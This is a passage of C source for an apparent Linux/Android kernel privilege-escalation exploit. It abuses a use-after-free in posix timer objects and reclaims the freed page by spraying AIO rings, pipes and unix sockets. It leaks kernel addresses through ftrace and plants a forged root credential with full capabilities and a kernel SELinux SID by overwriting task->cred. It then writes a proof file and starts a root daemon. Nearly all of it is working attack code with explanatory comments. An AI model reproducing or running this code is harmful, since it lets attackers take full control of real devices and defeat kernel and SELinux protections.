			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
				free_hits++;
				if (pfn == victim_base || pfn == node_pfn)
					victim_frees++;
				if (shown < 4) {
					dprintf(STDOUT_FILENO, "[free] %s", line);
					shown++;
				}
			}
			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
				alloc_hits++;
				if (shown < 10) {
					dprintf(STDOUT_FILENO, "[alloc] %s", line);
					shown++;
				}
			}
			if (!filemap)
				continue;
			if (g_hit_index < 0 && pfn == node_pfn) {
				g_hit_cpu = cpu;
				g_hit_index = lines;
			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
				other++;
			lines++;
		}
		fclose(file);
		g_cpu_lines[cpu] = lines;
		rings += g_cpu_n[cpu];
		dprintf(STDOUT_FILENO, "[aio] cpu%d rings=%d filemap=%d\n",
			cpu, g_cpu_n[cpu], lines);
	}
	g_nrings = rings;
	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
	    g_hit_index < g_cpu_n[g_hit_cpu]) {
		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
		uint64_t *node;
		if (ring[4] != UINT32_C(0xa10a10a1)) {
			dprintf(STDOUT_FILENO, "[aio] bad magic %#x\n", ring[4]);
			return -1;
		}
		node = (uint64_t *)((char *)ring + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
		__sync_synchronize();
		dprintf(STDOUT_FILENO,
			"[plant] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
		quiet_reclaim_trace();
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[aio] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
		rings, other, free_hits, alloc_hits, victim_frees);
	quiet_reclaim_trace();
	return -1;
}

static unsigned long *g_hold;
static int g_nhold;
static pid_t g_holders[4];

static int hold_aio_children(void)
{
	int ready[2];
	if (pipe(ready))
		return -1;
	for (int i = 0; i < 4; i++) {
		pid_t pid = fork();
		if (pid < 0)
			return -1;
		if (pid == 0) {
			int n = 0;
			close(ready[0]);
			while (n < 20000) {
				unsigned long ctx = 0;
				if (syscall(SYS_io_setup, 1, &ctx))
					break;
				n++;
			}
			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
				i, n, errno);
			if (write(ready[1], "x", 1) != 1)
				_exit(1);
			for (;;)
				pause();
		}
		g_holders[i] = pid;
	}
	close(ready[1]);
	for (int i = 0; i < 4; i++) {
		char bit;
		if (read(ready[0], &bit, 1) != 1)
			return -1;
	}
	close(ready[0]);
	return 0;
}
static int g_nhold;

static int drain_aio(void)
{
	g_hold = calloc(70000, sizeof(*g_hold));
	g_nhold = 0;
	if (!g_hold)
		return -1;
	while (g_nhold < 70000) {
		unsigned long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx))
			break;
		g_hold[g_nhold++] = ctx;
	}
	dprintf(STDOUT_FILENO, "[aio-hold] rings=%d errno=%d\n", g_nhold, errno);
	return g_nhold > 1000 ? 0 : -1;
}

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_catch[1024][2];
static int g_ncatch;

static int prepare_catch(void)
{
	g_ncatch = 0;
	for (int i = 0; i < 1024; i++) {
		if (pipe(g_catch[i]))
			break;
		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_catch[i][0]);
			close(g_catch[i][1]);
			break;
		}
		g_ncatch++;
	}
	dprintf(STDOUT_FILENO, "[pipe] empty=%d\n", g_ncatch);
	return g_ncatch >= 128 ? 0 : -1;
}

static int reclaim_pipe(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	uint64_t victim_base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	unsigned char *page;
	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
	if (node_off + 24 > 4096)
		return -1;
	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		return -1;
	memset(page, 0, 4096);
	{
		uint64_t *node = (uint64_t *)(page + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[pipe] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < g_ncatch; i++) {
		int done = 0;
		if ((i % 32) == 0) {
			struct timespec pause = { .tv_nsec = 100000000 };
			pin_cpu((i / 32) % ncpu);
			if (i)
				nanosleep(&pause, NULL);
		}
		while (done < 4096) {
			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
			if (n < 0)
				break;
			done += (int)n;
		}
		if (done == 4096)
			wrote_pages++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			if (pfn == UINT64_MAX || !watch_has(pfn))
				continue;
			if (strstr(line, "mm_page_free:"))
				free_hits++;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			if (pfn != node_pfn && pfn != victim_base)
				continue;
			if (strstr(line, "order=0"))
				order0++;
			if (strstr(line, "order=1"))
				order1++;
			dprintf(STDOUT_FILENO, "[pipe-alloc] %s", line);
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[pipe] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
		wrote_pages, free_hits, order0, order1);
	quiet_reclaim_trace();
	munmap(page, 4096);
	return order0 > 0 ? 0 : -1;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

static int g_fast;

int pc98260_run_rootd(void);

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	if (g_plant_cred) {
		/* 6.1.157 layout: posix_timers_cache objects are 0x118 bytes,
		 * 29 per order-1 slab; nodes sit at 0x78 + 0x118k.  The fake
		 * cred goes into the gap [0x1a0,0x250) (nearest nodes: 0x190
		 * and 0x2a8) and the SELinux blob into [0x1f28,0x1f48)
		 * (nearest nodes: 0x1f18 and 0x2030).  The rb node stays at
		 * node_off: {pc=cred_kva, rb_right=0, rb_left=task->cred}.
		 *
		 * rb_erase consumes case "left child only": it first stores
		 * *(task->cred) = cred_kva, then __rb_change_child() with
		 * parent = cred_kva rewrites parent->rb_right, i.e. cred+8.
		 * rb_next() runs before the erase (timerqueue_del keeps the
		 * cached leftmost): node->rb_right = 0, so it climbs to
		 * cred_kva, and because cred+8 == node_kva it climbs once
		 * more where rb_parent(cred_kva) = cred[0] & ~3 = 1 & ~3 = 0
		 * and returns NULL.  head->rb_leftmost becomes NULL, the
		 * cleanup loop stops and the fake cred is never processed as
		 * a timer node.  cred+8 (= gid/suid, clobbered with
		 * task->cred) is fixed afterwards by a zero-write. */
		const unsigned cred_off = 0x198;
		const unsigned blob_off = 0x250;
		uint64_t page = victim & ~UINT64_C(0x1fff);
		uint64_t node_kva = victim + KITIMER_NODE;
		uint64_t cred_kva = page + cred_off;
		uint64_t *node = (uint64_t *)(pat + node_off);
		unsigned char *cred = pat + cred_off;
		if (node_off + 24 > 8192 || cred_off + CRED_SIZE > 8192 ||
		    blob_off + CRED_BLOB_BYTES > 8192 ||
		    page + node_off != node_kva) {
			dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
				node_off);
			munmap(pat, 8192);
			return -1;
		}
		if (!(node_off >= cred_off + CRED_SIZE || cred_off >= node_off + 24) ||
		    !(node_off >= blob_off + CRED_BLOB_BYTES || blob_off >= node_off + 24)) {
			dprintf(STDOUT_FILENO, "[cred] cred/blob overlaps node off=%#x\n",
				node_off);
			munmap(pat, 8192);
			return -1;
		}
		node[0] = cred_kva;          /* rb_parent_color -> written at target */
		node[1] = 0;                 /* rb_right */
		node[2] = g_task + TASK_CRED;/* rb_left = task->cred destination */
		*(uint64_t *)(cred + 0x00) = 1;        /* usage=1, uid=0 */
		*(uint64_t *)(cred + 0x08) = node_kva; /* rb_right; gid/suid (fixed later) */
		*(uint64_t *)(cred + 0x10) = 0;        /* rb_left; sgid/euid */
		*(uint32_t *)(cred + 0x18) = 0;        /* egid */
		*(uint32_t *)(cred + 0x1c) = 0;        /* fsuid */
		*(uint32_t *)(cred + 0x20) = 0;        /* fsgid */
		*(uint64_t *)(cred + CRED_CAP_INH_OFF) = FULLCAP;
		*(uint64_t *)(cred + CRED_CAP_PRM_OFF) = FULLCAP;
		*(uint64_t *)(cred + CRED_CAP_EFF_OFF) = FULLCAP;
		*(uint64_t *)(cred + CRED_CAP_BSET_OFF) = FULLCAP;
		*(uint64_t *)(cred + CRED_CAP_AMB_OFF) = FULLCAP;
		*(uint64_t *)(cred + CRED_SECURITY_OFF) = page + blob_off;
		/* task_security_struct { u32 osid; u32 sid; ... }: SIDs must be
		 * live entries of the loaded policy or SELinux hooks that run
		 * outside avc (exec transitions etc.) return -EINVAL even in
		 * permissive mode.  SECINITSID_KERNEL (1) always exists. */
		*(uint32_t *)(pat + blob_off + 0x00) = 1; /* osid */
		*(uint32_t *)(pat + blob_off + 0x04) = 1; /* sid */
		*(uint64_t *)(cred + CRED_USER_OFF) = slide_addr(LINK_ROOT_USER);
		*(uint64_t *)(cred + CRED_USER_NS_OFF) = slide_addr(LINK_USER_NS);
		*(uint64_t *)(cred + CRED_UCOUNTS_OFF) = slide_addr(LINK_UCOUNTS);
		*(uint64_t *)(cred + CRED_GROUP_INFO_OFF) = slide_addr(LINK_GROUPS);
		g_cred_kva = cred_kva;
		dprintf(STDOUT_FILENO,
			"[cred] node=%#" PRIx64 " cred=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
			node_kva, cred_kva, g_task + TASK_CRED, node_off);
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream] tile align=%u off=%#x\n", align, node_off);
	}
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	if (!g_nstream) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	if (write_file(TRACE "/buffer_size_kb", "2048\n")) {
		close_stream();
		return -1;
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	dprintf(STDOUT_FILENO, "[stream] trace reset\n");
	{
		struct timespec poll = { .tv_nsec = 50000000 };
		int freed = 0;
		int waitn = g_fast ? 30 : 90;
		for (int i = 0; i < waitn && !freed; i++) {
			nanosleep(&poll, NULL);
			freed = raw_scan_pfn(base, 1, 0);
		}
		dprintf(STDOUT_FILENO, "[stream] page_freed=%d\n", freed);
		if (!freed) {
			quiet_reclaim_trace();
			munmap(pat, 8192);
			close_stream();
			return -1;
		}
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	int rounds = g_fast ? 30 : 40;
	for (int round = 0; round < rounds && !hit; round++) {
		int sends = g_fast ? 40 : 40;
		for (int i = 0, sock = 0; i < sends && !hit; i++) {
			ssize_t n;
			pin_cpu(i % ncpu);
			n = write(g_stream[sock][0], pat, 8192);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		hit = raw_scan_palloc(base, 1);
		if ((round % 5) == 0 || hit)
			dprintf(STDOUT_FILENO, "[spray] round %d writes=%d hit=%d\n",
				round, writes, hit);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 12)
			break;
		{
			struct timespec pace = { .tv_nsec = 60000000 };
			nanosleep(&pace, NULL);
		}
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream] hit pfn=%#" PRIx64 "\n", base);
	dprintf(STDOUT_FILENO, "[stream] writes=%d hit=%d\n", writes, hit);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int g_dgram[2] = { -1, -1 };

static int reclaim_dgram(uint64_t victim, uint64_t target)
{
	uint64_t node_pfn = object_pfn(victim + KITIMER_NODE);
	uint64_t base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0xfff);
	unsigned char *buf;
	int ncpu, sent = 0, hit = 0, big = 8 << 20;
	int victim_frees = 0, buddy_frees = 0, order2 = 0;
	uint64_t buddy = base ^ UINT64_C(2);
	if (node_off + 24 > 4096)
		return -1;
	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		return -1;
	memset(buf, 0, 16000);
	for (int page = 0; page < 4; page++) {
		unsigned off = (unsigned)page * 4096u + node_off;
		uint64_t *node;
		if (off + 24 > 16000)
			continue;
		node = (uint64_t *)(buf + off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
		munmap(buf, 16384);
		return -1;
	}
	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[dgram] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < 512; i++) {
		struct timespec pause = { .tv_nsec = 40000000 };
		ssize_t n;
		if ((i % 8) == 0)
			pin_cpu((i / 8) % ncpu);
		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
		if (n == 16000)
			sent++;
		else if (i > 16 && sent > 8)
			break;
		if ((i % 8) == 7)
			nanosleep(&pause, NULL);
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX)
				continue;
			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
				if (pfn == base)
					victim_frees++;
				if (pfn == buddy)
					buddy_frees++;
			}
			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
				continue;
			order2++;
			if (base == pfn || base == pfn + 2) {
				hit = 1;
				dprintf(STDOUT_FILENO, "[dgram] hit %s", line);
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[dgram] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
		sent, hit, order2, victim_frees, buddy_frees, buddy);
	quiet_reclaim_trace();
	munmap(buf, 16384);
	return hit ? 0 : -1;
}

static int one_uaf(uint64_t target)
{
	struct timespec c0, c1;
	long cms;
	clock_gettime(CLOCK_MONOTONIC, &c0);
	pid_t child;
	int code, status = 0;
	uint64_t ptrs[64];
	int nptr, ntext;
	uint64_t victim;
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	child = fork();
	if (child < 0)
		return -1;
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (write_file(TRACE "/buffer_size_kb", "8192\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		kill(child, SIGKILL);
		stop_helpers();
		return -1;
	}
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (collect_nth(1024, &nptr, &victim)) {
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n"))
		return -1;
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	if (reclaim_stream(victim, target)) {
		clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=page_miss fast=%d\n", cms, g_fast);
	dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
		stop_helpers();
		return -1;
	}
	close_socks();
	code = wait_zombie(child, &status);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (waitpid(child, &status, 0) < 0)
		return -1;
	clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=ok fast=%d\n", cms, g_fast);
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	destroy_rings();
	stop_helpers();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
		return -1;
	}
	return 0;
}

static void cred_child(void)
{
	sigset_t block;
	setpgid(0, 0);
	sigfillset(&block);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	dprintf(STDOUT_FILENO, "[child-cred] waiting pid=%d\n", getpid());
	for (;;) {
		unsigned uid, euid, gid, egid;
		unsigned char go;
		char msg[96];
		if (read(g_wake[0], &go, 1) != 1)
			continue;
		uid = getuid();
		euid = geteuid();
		gid = getgid();
		egid = getegid();
		snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
			 uid, euid, gid, egid);
		if (write(g_report[1], msg, strlen(msg)) < 0)
			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
		if (uid == 0 && euid == 0) {
			int sg = syscall(SYS_setresgid, 0, 0, 0);
			int su = syscall(SYS_setresuid, 0, 0, 0);
			dprintf(STDOUT_FILENO,
				"[child-cred] setresgid=%d setresuid=%d now=%u/%u/%u/%u\n",
				sg, su, getuid(), geteuid(), getgid(), getegid());
			int tpid = fork();
			if (tpid == 0) {
				char *const argv[] = { (char *)"sh", (char *)"-c",
					(char *)"id > /data/local/tmp/magic61/exec-proof.txt 2>&1", NULL };
				char *const envp[] = { (char *)"PATH=/system/bin", NULL };
				execve("/system/bin/sh", argv, envp);
				dprintf(STDOUT_FILENO, "[child-cred] execve errno=%d\n", errno);
				_exit(127);
			}
			dprintf(STDOUT_FILENO, "[child-cred] probe fork=%d errno=%d\n",
				tpid, errno);
			pc98260_run_rootd();
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	if (kill(g_cred_child_pid, 0) != 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d is dead errno=%d\n",
			g_cred_child_pid, errno);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

static int leak_task(void)
{
	uint8_t *buf;
	uint64_t last_self = 0, last_any = 0, cs_self = 0;
	int hits = 0, mine = 0;
	pid_t self = getpid();
	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on())
		return -1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	buf = malloc(8U << 20);
	if (!buf)
		return -1;
	for (int cpu = 0; cpu < 8; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (8U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (8U << 20))
				break;
		}
		close(fd);
		for (size_t i = 8; i + 32 <= used; i++) {
			uint64_t cs, ptr, req, alloc;
			int pid;
			memcpy(&cs, buf + i, 8);
			if ((cs >> 48) != 0xffff)
				continue;
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 16, 8);
			memcpy(&alloc, buf + i + 24, 8);
			memcpy(&pid, buf + i - 4, 4);
			if (req != TASK_ALLOC_SIZE || alloc != TASK_ALLOC_SIZE)
				continue;
			if ((ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			hits++;
			last_any = ptr;
			if (pid == self) {
				mine++;
				last_self = ptr;
				cs_self = cs;
				dprintf(STDOUT_FILENO,
					"[task] cpu%d site=%#" PRIx64 " ptr=%#" PRIx64 "\n",
					cpu, cs, ptr);
			}
		}
	}
	free(buf);
	g_task = last_self ? last_self : last_any;
	if (last_self && cs_self > COPY_ALLOC_LINK) {
		uint64_t slide = cs_self - COPY_ALLOC_LINK;
		if (slide < (UINT64_C(1) << 40)) {
			g_slide = slide;
			dprintf(STDOUT_FILENO, "[slide] derived %#" PRIx64 "\n", slide);
		}
	}
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	if (hits && !mine)
		dprintf(STDOUT_FILENO, "[task] no pid match, %d foreign hits\n", hits);
	return hits ? 0 : -1;
}

/* ---- linear-map base calibration -------------------------------------
 * A slab page whose trace pfn is P lives at VA (P << 12) + C.  C is per
 * boot (linear-map KASLR) but constant for all pages.  A burst of timers
 * pinned to cpu0 forces order-1 slab allocations; in the same raw trace
 * the first k_itimer of each new slab is preceded by its mm_page_alloc.
 * Pairing (pfn, object VA) yields C; 40+ consistent pairs vote it in. */
#define CAL_EV_MAX 8192
static uint32_t cal_vpos[CAL_EV_MAX];
static uint64_t cal_vval[CAL_EV_MAX];
static uint32_t cal_ppos[CAL_EV_MAX];
static uint64_t cal_pval[CAL_EV_MAX];
static uint64_t cal_cand[32];
static int cal_cand_n[32];

static void cal_vote(uint64_t c)
{
	if (c & UINT64_C(0x1fff))
		return;
	for (int i = 0; i < 32; i++) {
		if (cal_cand_n[i] && cal_cand[i] == c) {
			cal_cand_n[i]++;
			return;
		}
		if (!cal_cand_n[i]) {
			cal_cand[i] = c;
			cal_cand_n[i] = 1;
			return;
		}
	}
}

static int calibrate_pfnbase(void)
{
	uint64_t site = slide_addr(TIMER_LINK);
	uint64_t best = 0;
	int best_n = 0, total = 0, ncpu = cpu_count();
	pid_t c;

	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") ||
	    trigger_cmd("enable_event:kmem:mm_page_alloc\n") ||
	    kick_rss() || trace_off_on())
		return -1;
	c = fork();
	if (c == 0) {
		struct sigevent ev;
		timer_t *ids;
		cpu_set_t set;
		memset(&ev, 0, sizeof(ev));
		ev.sigev_notify = SIGEV_NONE;
		CPU_ZERO(&set);
		CPU_SET(0, &set);
		sched_setaffinity(0, sizeof(set), &set);
		ids = calloc(4096, sizeof(*ids));
		if (ids) {
			for (int i = 0; i < 4096; i++)
				if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &ids[i]))
					break;
		}
		_exit(0);
	}
	if (c < 0)
		return -1;
	waitpid(c, NULL, 0);
	write_file(TRACE "/tracing_on", "0\n");
	memset(cal_cand_n, 0, sizeof(cal_cand_n));
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		uint8_t *buf = malloc(8U << 20);
		size_t used = 0, nv = 0, np = 0, vi;
		int fd;
		if (!buf)
			return -1;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd >= 0) {
			alarm(2);
			while (used + 65536 < (8U << 20)) {
				ssize_t n = read(fd, buf + used, (8U << 20) - used);
				if (n <= 0)
					break;
				used += (size_t)n;
			}
			alarm(0);
			close(fd);
		}
		for (size_t i = 8; i + 32 <= used; i++) {
			uint64_t v;
			memcpy(&v, buf + i, 8);
			if (v == site && nv < CAL_EV_MAX) {
				uint64_t ptr, req, alloc;
